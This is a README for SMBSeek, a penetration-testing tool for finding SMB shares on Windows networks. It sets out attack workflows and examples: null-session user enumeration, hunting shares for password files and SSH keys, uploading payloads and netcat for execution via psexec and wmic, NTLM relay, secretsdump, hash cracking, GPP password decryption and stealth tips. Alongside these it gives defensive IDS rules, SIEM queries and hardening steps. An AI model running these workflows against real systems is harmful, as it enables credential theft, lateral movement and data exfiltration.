# SMBSeek - SMB Share Discovery and Enumeration Tool

## Overview
SMBSeek is a specialized SMB (Server Message Block) share discovery and enumeration tool designed for penetration testing internal Windows networks. It identifies hosts with SMB enabled, tests for null sessions and guest access, enumerates shares, and optionally tests access to discovered shares. The tool is optimized for quickly identifying misconfigured file shares that could lead to unauthorized data access.

SMB shares are one of the most common targets in internal penetration tests, frequently providing access to sensitive files, credentials, and network information through misconfigurations like null sessions, guest access, or overly permissive permissions.

**Version**: 1.0  
**Author**: Internal Red Team  
**Platform**: Kali Linux / Python 3.6+

## Features
- **Port Scanning**: Tests both NetBIOS (139) and SMB (445) ports
- **Null Session Detection**: Tests for anonymous SMB access
- **Guest Access Testing**: Attempts guest account access
- **Share Enumeration**: Lists all available SMB shares
- **Access Testing**: Optionally tests read/write access to shares
- **Interesting Share Identification**: Highlights high-value targets (C$, ADMIN$, Backups, etc.)
- **Credential Support**: Use captured/known credentials for authenticated enumeration
- **Concurrent Scanning**: Multi-threaded for fast network-wide discovery
- **Multiple Output Formats**: TXT (human-readable), JSON (machine-readable), share lists

## Installation

### Prerequisites
```bash
# Required: smbclient
sudo apt install smbclient

# Optional but recommended: rpcclient (usually included with smbclient)
sudo apt install samba-common-bin

# Verify installation
smbclient --version
rpcclient --version
```

### Setup
```bash
# Clone or copy tool
cd /opt/tools/seek/
chmod +x smbseek.py

# Create IP list
echo "192.168.1.0/24" > iplist.txt

# Basic scan
./smbseek.py
```

## Usage

### Basic Commands

```bash
# Basic discovery (port scan + null session test)
./smbseek.py

# Test share access
./smbseek.py -t

# Use credentials (e.g., from Responder)
./smbseek.py -u admin -p Password123

# Full scan with credentials + access testing
./smbseek.py -u admin -p pass -t

# Verbose output (show all hosts)
./smbseek.py -v

# Custom target file
./smbseek.py -f smb_hosts.txt -t -v

# Fast scan (20 workers)
./smbseek.py -w 20

# Custom timeout
./smbseek.py --timeout 3
```

### Command-Line Options

```
positional arguments:
  None (uses iplist.txt by default)

optional arguments:
  -h, --help            Show help message and exit
  -f FILE, --file FILE  Input file with IP addresses (default: iplist.txt)
  -w N, --workers N     Number of concurrent workers (default: 10)
  -t, --test-access     Test access to discovered shares
  -u USER, --username USER
                        Username for authentication
  -p PASS, --password PASS
                        Password for authentication
  --timeout SECONDS     Connection timeout (default: 2)
  -v, --verbose         Verbose output (show all hosts)
```

## Input File Format

### iplist.txt
```
# SMB hosts to scan
192.168.1.50
192.168.1.51
192.168.1.0/24
10.0.0.100-200
```

**Supported Formats**:
- Individual IPs: `192.168.1.50`
- CIDR notation: `192.168.1.0/24`
- Comments: Lines starting with `#`

## Output Files

### 1. smblist.txt (Simple List)
List of all IPs with SMB enabled.

```
192.168.1.50
192.168.1.51
192.168.1.52
```

**Use Cases**:
- Input for other tools (enum4linux, crackmapexec, Metasploit)
- Quick reference
- Asset inventory

### 2. sharelist.txt (UNC Paths)
List of accessible shares in UNC path format.

```
\\192.168.1.50\Users
\\192.168.1.50\Backup
\\192.168.1.51\Data
\\192.168.1.52\Share
```

**Use Cases**:
- Mount shares manually
- Feed to automated scripts
- Document accessible resources

### 3. smb_details.txt (Detailed Report)
Comprehensive human-readable report.

```
SMBSeek - SMB Share Discovery Results
======================================================================
Scan Date: 2025-10-14 12:00:00
Total Hosts with SMB: 15
Hosts with Accessible Shares: 8
======================================================================

Host: 192.168.1.50
Hostname: fileserver01.company.local
Ports: 139, 445
⚠ NULL SESSION ALLOWED
Shares Found: 5
----------------------------------------------------------------------

  Share: C$
  Type: Disk
  ✓ ACCESSIBLE (Readable: True, Files: 24)
  ★ INTERESTING SHARE

  Share: ADMIN$
  Type: Disk
  ★ INTERESTING SHARE

  Share: Users
  Type: Disk
  ✓ ACCESSIBLE (Readable: True, Files: 156)
  ★ INTERESTING SHARE

  Share: Backup
  Type: Disk
  Comment: Weekly backups
  ✓ ACCESSIBLE (Readable: True, Files: 45)
  ★ INTERESTING SHARE

  Share: IPC$
  Type: IPC
  Comment: Remote IPC

======================================================================
```

### 4. smb_details.json (Machine-Readable)
Complete scan results in JSON format.

```json
[
  {
    "ip": "192.168.1.50",
    "hostname": "fileserver01.company.local",
    "smb_enabled": true,
    "ports_open": [
      {"port": 139, "service": "NetBIOS"},
      {"port": 445, "service": "SMB"}
    ],
    "shares": [
      {"name": "C$", "type": "Disk", "comment": ""},
      {"name": "ADMIN$", "type": "Disk", "comment": ""},
      {"name": "Users", "type": "Disk", "comment": ""},
      {"name": "Backup", "type": "Disk", "comment": "Weekly backups"},
      {"name": "IPC$", "type": "IPC", "comment": "Remote IPC"}
    ],
    "accessible_shares": [
      {"name": "C$", "readable": true, "writable": false, "files_found": 24},
      {"name": "Users", "readable": true, "writable": false, "files_found": 156},
      {"name": "Backup", "readable": true, "writable": false, "files_found": 45}
    ],
    "interesting_shares": ["C$", "ADMIN$", "Users", "Backup"],
    "null_session": true,
    "guest_access": false,
    "error": null
  }
]
```

## SMB Shares Explained

### Administrative Shares (Windows Default)
- **C$**: Root of C: drive (requires admin privileges)
- **ADMIN$**: Windows installation directory (e.g., C:\Windows)
- **IPC$**: Inter-Process Communication (used for RPC, null sessions)
- **PRINT$**: Printer drivers
- **FAX$**: Fax services (if installed)

### Domain Shares (Active Directory)
- **SYSVOL**: Group Policy and logon scripts (read-only for authenticated users)
- **NETLOGON**: Legacy logon scripts

### Common Custom Shares
- **Users/Public**: User home directories
- **Backup/Backups**: Backup files (often contains sensitive data)
- **Share/Shares**: Generic file sharing
- **Data/Files**: Data storage
- **Transfer/Temp**: File transfer locations
- **IT/Software/Installers**: Software distribution

## Attack Workflows

### Workflow 1: Quick Network Enumeration
**Objective**: Identify all SMB hosts with accessible shares

```bash
# 1. Fast discovery
./smbseek.py -w 20

# 2. Review hosts with null sessions
cat smb_details.txt | grep -B 5 "NULL SESSION"

# 3. Count accessible shares
cat sharelist.txt | wc -l

# 4. List interesting shares
cat smb_details.txt | grep "★ INTERESTING"
```

**Expected Output**:
- List of SMB-enabled hosts
- Hosts allowing null sessions or guest access
- Accessible shares by IP

### Workflow 2: Null Session Enumeration
**Objective**: Exploit null sessions for reconnaissance

```bash
# 1. Discover null sessions
./smbseek.py

# 2. Extract null session hosts
cat smb_details.txt | grep -A 20 "NULL SESSION" > null_sessions.txt

# 3. Manual enumeration with enum4linux
for ip in $(cat smblist.txt); do
    enum4linux -a $ip > enum4linux_${ip}.txt 2>&1
done

# 4. Extract user lists
grep "user:" enum4linux_*.txt | cut -d':' -f3 | sort -u > users.txt
```

**Common Findings**:
- User accounts and group memberships
- Password policy information
- Share permissions
- Domain SID information

### Workflow 3: Share Access Testing
**Objective**: Test read/write access to discovered shares

```bash
# 1. Enumerate with access testing
./smbseek.py -t

# 2. Review accessible shares
cat sharelist.txt

# 3. Mount interesting share
mkdir /mnt/share
mount -t cifs //192.168.1.50/Users /mnt/share -o guest

# 4. Search for sensitive files
find /mnt/share -name "*.txt" -o -name "*.doc*" -o -name "*.xls*"
grep -ri "password" /mnt/share/
find /mnt/share -name "*.kdbx" -o -name "*.key" -o -name "id_rsa"

# 5. Unmount
umount /mnt/share
```

### Workflow 4: Authenticated Enumeration
**Objective**: Use captured credentials to enumerate additional shares

```bash
# 1. Scan with credentials (e.g., from Responder)
./smbseek.py -u admin -p Password123 -t -v

# 2. Compare with null session results
# Authenticated access often reveals more shares

# 3. Access administrative shares
smbclient //192.168.1.50/C$ -U admin%Password123
smb: \> ls
smb: \> cd Users
smb: \> ls

# 4. Download sensitive files
smb: \> get important_file.txt
```

### Workflow 5: Lateral Movement via Shares
**Objective**: Use SMB shares for lateral movement

```bash
# 1. Find writable shares
./smbseek.py -t -u user -p pass

# 2. Upload tool to writable share
smbclient //192.168.1.50/Transfer -U user%pass
smb: \> put payload.exe
smb: \> put nc.exe

# 3. Execute via PsExec or WMIC
psexec.py user:pass@192.168.1.50 cmd.exe
wmic /node:192.168.1.50 /user:user /password:pass process call create "\\192.168.1.50\Transfer\payload.exe"

# 4. Establish persistence
# Upload backdoor to SYSVOL or startup folders
```

## Exploitation Examples

### Example 1: Null Session Enumeration
**Scenario**: Domain controller with null session enabled

```bash
# Discovery
$ ./smbseek.py -v
[MEDIUM] 192.168.1.10 (dc01.company.local), 3 shares [NULL SESSION]
    ★ Interesting: SYSVOL, NETLOGON, IPC$

# Manual enumeration
$ rpcclient -U "" 192.168.1.10 -N
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[john.doe] rid:[0x451]
user:[jane.smith] rid:[0x452]
...

rpcclient $> queryuser 0x451
        User Name   :   john.doe
        Full Name   :   John Doe
        Home Drive  :   H:
        Description :   IT Administrator
...

# Impact: Complete user enumeration, can be used for password spraying
```

### Example 2: Accessible Backup Share
**Scenario**: Backup share with sensitive data accessible via guest account

```bash
# Discovery
$ ./smbseek.py -t
[HIGH] 192.168.1.50 (fileserver.company.local), 4 shares, 2 accessible [GUEST ACCESS]
    ★ Interesting: Backup
    ✓ \\192.168.1.50\Backup (Files: 127)

# Mount share
$ mkdir /mnt/backup
$ mount -t cifs //192.168.1.50/Backup /mnt/backup -o guest

# Search for sensitive files
$ find /mnt/backup -name "*password*" -o -name "*credential*"
/mnt/backup/IT/passwords.txt
/mnt/backup/Scripts/db_credentials.xml
/mnt/backup/AD_Backup/ntds.dit

# Extract credentials
$ cat /mnt/backup/IT/passwords.txt
Domain Admin: CompanyAdmin2023!
SQL SA: SQLPass2023!
vCenter: vCenter@2023

# Impact: Domain admin credentials discovered
```

### Example 3: C$ Access with Stolen Credentials
**Scenario**: Responder captured admin credentials, C$ accessible

```bash
# Responder capture
[SMB] NTLMv2-SSP Hash: COMPANY\admin:hash...

# Crack hash
$ hashcat -m 5600 hash.txt rockyou.txt
COMPANY\admin:Admin@2023!

# Test access
$ ./smbseek.py -u admin -p Admin@2023! -t
[HIGH] 192.168.1.51 (workstation-05), 5 shares, 3 accessible
    ✓ \\192.168.1.51\C$ (Files: 24)
    ✓ \\192.168.1.51\ADMIN$ (Files: 15)

# Access C$
$ smbclient //192.168.1.51/C$ -U admin%Admin@2023!
smb: \> cd Users
smb: \> cd Administrator
smb: \> cd Desktop
smb: \> get passwords.txt
smb: \> cd ..\Documents
smb: \> get ssh_keys.zip

# Impact: Complete file system access, credential harvesting
```

### Example 4: SYSVOL Group Policy Enumeration
**Scenario**: Authenticated domain user access to SYSVOL

```bash
# Discovery
$ ./smbseek.py -u jdoe -p UserPass123 -t
[MEDIUM] 192.168.1.10 (dc01.company.local), 4 shares
    ★ Interesting: SYSVOL, NETLOGON
    ✓ \\192.168.1.10\SYSVOL (Files: 89)

# Mount SYSVOL
$ mkdir /mnt/sysvol
$ mount -t cifs //192.168.1.10/SYSVOL /mnt/sysvol -o username=jdoe,password=UserPass123

# Search for GPP passwords (MS14-025)
$ find /mnt/sysvol -name "Groups.xml"
/mnt/sysvol/company.local/Policies/{...}/Machine/Preferences/Groups/Groups.xml

$ cat /mnt/sysvol/.../Groups.xml | grep cpassword
cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"

# Decrypt GPP password
$ gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
LocalAdmin123!

# Impact: Local administrator password from Group Policy Preferences
```

## Integration with Other Tools

### enum4linux
```bash
# Basic enumeration
enum4linux -a 192.168.1.50

# Null session enumeration
enum4linux -U -S -G -P 192.168.1.50

# With credentials
enum4linux -u admin -p password -a 192.168.1.50
```

### CrackMapExec
```bash
# SMB enumeration
crackmapexec smb 192.168.1.0/24

# Check null sessions
crackmapexec smb 192.168.1.0/24 -u '' -p ''

# Share enumeration with credentials
crackmapexec smb 192.168.1.0/24 -u admin -p password --shares

# Find writable shares
crackmapexec smb 192.168.1.0/24 -u admin -p password --shares --filter-shares WRITE
```

### Metasploit
```bash
msfconsole

# SMB version detection
use auxiliary/scanner/smb/smb_version
set RHOSTS file:smblist.txt
run

# Share enumeration
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS file:smblist.txt
run

# Null session testing
use auxiliary/scanner/smb/smb_lookupsid
set RHOSTS file:smblist.txt
run
```

### Impacket Tools
```bash
# SMB brute force
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt

# SMB command execution
psexec.py admin:password@192.168.1.50

# SMB relay attack
ntlmrelayx.py -tf smblist.txt -smb2support

# Secret dump
secretsdump.py admin:password@192.168.1.50
```

### Custom Scripts
```bash
#!/bin/bash
# Auto-mount all accessible shares

# Parse sharelist.txt for accessible shares
while read share; do
    # Extract IP and share name
    ip=$(echo $share | cut -d'\' -f3)
    name=$(echo $share | cut -d'\' -f4)
    
    # Create mount point
    mkdir -p /mnt/${ip}_${name}
    
    # Mount share
    mount -t cifs //${ip}/${name} /mnt/${ip}_${name} -o guest 2>/dev/null
    
    if [ $? -eq 0 ]; then
        echo "[+] Mounted: /mnt/${ip}_${name}"
    fi
done < sharelist.txt
```

## Detection & Defense

### Network Detection

**IDS Signatures (Snort/Suricata)**:
```snort
# SMB enumeration attempts
alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (
    msg:"SMB Share Enumeration";
    flow:to_server,established;
    content:"|ff|SMB|72|"; offset:4; depth:5;
    threshold:type threshold, track by_src, count 10, seconds 60;
    sid:3000400;
)

# Null session attempts
alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (
    msg:"SMB Null Session Attempt";
    flow:to_server,established;
    content:"|00 00 00 00|"; content:"|00 00 00 00|"; distance:0;
    sid:3000401;
)

# Multiple share access attempts
alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (
    msg:"Multiple SMB Tree Connect Requests";
    flow:to_server,established;
    content:"|ff|SMB|75|"; offset:4; depth:5;
    threshold:type threshold, track by_src, count 20, seconds 60;
    sid:3000402;
)
```

### SIEM Detection Rules

**Splunk Query**:
```spl
index=windows sourcetype=WinEventLog:Security EventCode=5140
| stats count by src_ip, ShareName
| where count > 10
| table src_ip, ShareName, count
```

**ELK Query**:
```json
{
  "query": {
    "bool": {
      "must": [
        {"match": {"event.code": "5140"}},
        {"range": {"@timestamp": {"gte": "now-1h"}}}
      ]
    }
  },
  "aggs": {
    "share_access": {
      "terms": {"field": "source.ip", "size": 20}
    }
  }
}
```

### SMB Hardening

**Disable Null Sessions** (Windows Registry):
```reg
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters]
"RestrictNullSessAccess"=dword:00000001
"NullSessionShares"=""
```

**Disable Guest Account**:
```powershell
# PowerShell
Disable-LocalUser -Name "Guest"

# Command Prompt
net user guest /active:no
```

**Remove Administrative Shares** (NOT recommended for workstations/servers):
```reg
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters]
"AutoShareWks"=dword:00000000      # Workstations
"AutoShareServer"=dword:00000000   # Servers
```

**Restrict Share Permissions**:
```powershell
# Remove Everyone group, add specific users
Remove-SmbShareAccess -Name "ShareName" -AccountName "Everyone" -Force
Grant-SmbShareAccess -Name "ShareName" -AccountName "DOMAIN\AuthorizedGroup" -AccessRight Full
```

**Disable SMBv1** (vulnerable to EternalBlue):
```powershell
# Windows Server
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol

# Windows 10/11
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
```

**Enable SMB Signing**:
```powershell
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
Set-SmbClientConfiguration -RequireSecuritySignature $true -Force
```

**Firewall Configuration**:
```powershell
# Block SMB from external networks
New-NetFirewallRule -DisplayName "Block SMB Inbound" -Direction Inbound -LocalPort 445,139 -Protocol TCP -Action Block -RemoteAddress Internet
```

### Audit Logging

**Enable SMB Auditing** (Group Policy):
```
Computer Configuration → Windows Settings → Security Settings → Advanced Audit Policy Configuration
→ Object Access → Audit File Share
Enable: Success and Failure
```

**Windows Event IDs to Monitor**:
- **5140**: Network share accessed
- **5142**: Network share created
- **5143**: Network share modified
- **5144**: Network share deleted
- **5145**: Network share access denied
- **4672**: Special privileges assigned to new logon (admin share access)

**PowerShell Auditing**:
```powershell
# Get recent share access events
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 5140} | Select-Object -First 100
```

## Troubleshooting

### smbclient Not Found

**Problem**: "smbclient not found" error

**Solution**:
```bash
# Install smbclient
sudo apt update
sudo apt install smbclient samba-common-bin

# Verify
smbclient --version
```

### No Shares Found

**Problem**: Tool reports no shares, but shares exist

**Solutions**:
```bash
# Increase timeout
./smbseek.py --timeout 5

# Try with credentials
./smbseek.py -u username -p password

# Manual test
smbclient -L //192.168.1.50 -N
rpcclient -U "" 192.168.1.50 -N -c "netshareenum"

# Check firewall
sudo iptables -L | grep 445
```

### Access Denied

**Problem**: "Access Denied" when testing share access

**Causes**:
- Null sessions disabled
- Guest account disabled
- No read permissions on shares
- Firewall blocking connections

**Solutions**:
```bash
# Try with credentials
./smbseek.py -u username -p password -t

# Test manual access
smbclient //192.168.1.50/ShareName -U username%password
smbclient //192.168.1.50/ShareName -U guest%

# Check share permissions
crackmapexec smb 192.168.1.50 -u username -p password --shares
```

### Connection Timeout

**Problem**: Frequent timeouts during scanning

**Solutions**:
```bash
# Increase timeout
./smbseek.py --timeout 5

# Reduce workers
./smbseek.py -w 5

# Check network connectivity
ping 192.168.1.50
telnet 192.168.1.50 445
```

## Tips & Tricks

### 🎯 Targeting
- Focus on file servers (hostnames: file, share, fs, nas)
- Domain controllers always have SYSVOL and NETLOGON
- Backup servers often have loose permissions
- Development systems frequently misconfigured

### 🔍 Discovery
- Always test null sessions first (fastest)
- Look for non-standard share names (often less secure)
- Check for shares with "$" at end (hidden shares)
- Administrative shares (C$, ADMIN$) require admin privileges

### 🔒 Stealth
- Lower worker count: `-w 5`
- Avoid repeated scans (creates logs)
- SMB access is normal Windows traffic (hard to distinguish from legitimate use)
- Spread access over time

### ⚡ Speed
- High workers: `-w 50` for large networks
- Pre-filter with Nmap: `nmap -p 445 --open`
- Skip access testing on first pass: just enumeration
- Use JSON output for automated parsing

### 📁 High-Value Targets
- **SYSVOL**: Group Policy Preferences passwords (GPP)
- **NETLOGON**: Login scripts with hardcoded credentials
- **C$**: Complete file system access
- **Backup/Backups**: Database dumps, password vaults
- **IT/Software**: Software licenses, configuration files
- **Users**: User documents, saved passwords

### 🔑 Credentials
- Test credentials from Responder immediately
- Credential reuse is extremely common
- Local admin credentials often work across multiple systems
- Service account credentials may access many shares

## Real-World Examples

### Example 1: Fortune 500 Pentest
**Scenario**: /16 internal network, 5000+ Windows hosts

```bash
$ ./smbseek.py -w 50
Scan Complete
Total Hosts Scanned: 5234
Hosts with SMB: 1873
Hosts with Shares: 892
Null Session Allowed: 127

Critical Findings:
- 127 systems with null sessions (user enumeration)
- 45 backup shares accessible (guest account)
- 12 SYSVOL accessible (GPP password found)
- Impact: Domain admin credentials from GPP passwords
```

### Example 2: Small Business Audit
**Scenario**: 50-host network, no domain

```bash
$ ./smbseek.py -t -v
[HIGH] 192.168.1.50 (SERVER), 8 shares, 5 accessible [GUEST ACCESS]
    ✓ \\192.168.1.50\Company (Files: 1,234)
    ✓ \\192.168.1.50\Accounting (Files: 567)
    ✓ \\192.168.1.50\HR (Files: 234)

$ mount -t cifs //192.168.1.50/Accounting /mnt/accounting -o guest
$ find /mnt/accounting -name "*password*"
/mnt/accounting/QuickBooks/passwords.txt

Impact: Accounting software credentials, payroll data access
```

### Example 3: Post-Compromise Enumeration
**Scenario**: Captured domain user credentials via phishing

```bash
# Captured: jdoe:Password123!

$ ./smbseek.py -u jdoe -p Password123! -t
[HIGH] 192.168.1.10 (DC01), 4 shares, 2 accessible
    ✓ \\192.168.1.10\SYSVOL (Files: 156)
    ✓ \\192.168.1.10\NETLOGON (Files: 23)

[HIGH] 192.168.1.20 (FILESERVER), 12 shares, 8 accessible
    ✓ \\192.168.1.20\Departments (Files: 5,678)
    ✓ \\192.168.1.20\Projects (Files: 2,345)

Impact: Access to 10+ file shares across network with single domain user credential
```

## Security Considerations

### Ethical Use
- **Authorized testing only**: Never scan systems without written permission
- **Scope compliance**: Only scan networks specified in engagement
- **Data handling**: Treat discovered files as highly sensitive
- **Responsible disclosure**: Report findings through proper channels

### Tool Limitations
- **Credential testing only**: Does not brute force passwords
- **SMB versions**: Works with SMBv1, SMBv2, SMBv3
- **No exploitation**: Discovery and enumeration only
- **Network noise**: Generates SMB traffic and Windows logs

### Legal Considerations
- Unauthorized access to computer systems is illegal
- SMB enumeration may be considered "unauthorized access"
- Always operate under explicit authorization
- Follow penetration testing rules of engagement

## References
- **MS-SMB Protocol**: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/
- **MS-SMB2 Protocol**: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/
- **Null Session Attacks**: https://www.sans.org/reading-room/whitepapers/windows/
- **SMB Security Best Practices**: https://docs.microsoft.com/en-us/windows-server/storage/file-server/smb-security
- **MITRE ATT&CK**: T1021.002 (Remote Services: SMB/Windows Admin Shares), T1039 (Data from Network Shared Drive)
- **CWE-284**: Improper Access Control
- **CVE-2017-0143**: EternalBlue (SMBv1 vulnerability)
- **MS14-025**: Group Policy Preferences Password Disclosure

---

**Note**: This tool is designed for authorized penetration testing and security assessments only. Misuse of this tool against systems without explicit permission is illegal and unethical.
